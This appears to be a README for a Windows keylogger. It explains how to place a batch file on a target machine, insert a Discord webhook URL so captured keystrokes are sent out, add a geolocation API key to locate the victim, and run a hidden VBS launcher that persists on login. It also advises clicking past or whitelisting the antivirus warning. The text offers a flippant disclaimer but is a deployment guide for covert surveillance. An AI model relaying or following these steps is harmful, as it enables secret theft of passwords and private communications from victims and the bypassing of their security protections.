<b>notes:</b>

- i made this purely out of curiousity, please don't go around keylogging people lol

- should only work on windows

- the â†ž symbol is used to show where the user pressed backspace

- runs on user login

<b>Steps to run:</b>

1). download `setupstuff.bat` on whatever machine you plan to log the keystrokes on

2). open `setupstuff.bat` in any text editor and find the line containing `webhook_url = ""` - here you will need to put your discord webhook url in the quotes

3). find the line containing `api_key = ""` - here you will need to put your geolocation api key between the quotes - you can get the api key free at ipgeolocation.io, you can also use any other ip api by editing the get request further into the code

4). run it obviously -- it will probably trigger some sort of antivirus since <i>it's literally a random bat file you downloaded from the internet that creates a keylogger</i> but just click past it or add it to the antivirus ignore list

5). run `RUNME.vbs` by double clicking it - nothing visual will happen but it should start keylogging, don't click it more times or it'l run multiple times & send the logs multiple times

that is it
